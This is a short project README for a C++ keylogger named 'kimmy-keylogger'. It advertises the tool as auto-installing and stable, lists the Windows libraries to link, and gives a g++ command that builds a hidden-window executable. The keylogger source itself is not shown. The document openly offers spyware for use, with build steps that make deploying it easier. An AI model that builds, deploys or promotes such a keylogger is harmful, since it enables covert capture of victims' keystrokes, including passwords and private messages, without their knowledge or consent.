# kimmy-keylogger
Auto-install and stable keylogger in c++ for you &lt;3

# Compilling 
  To compile this code you need to link with following libraries: 
* Iphlpapi
* lole32 
* uuid
 
This is an example:

     [g++ -Wswitch-bool -w -LC:\\Program Files\\mingw32-gcc6\\lib Kimmy.cpp -o Kimmy.exe -lIphlpapi -lole32 -luuid -mwindows -static]
     
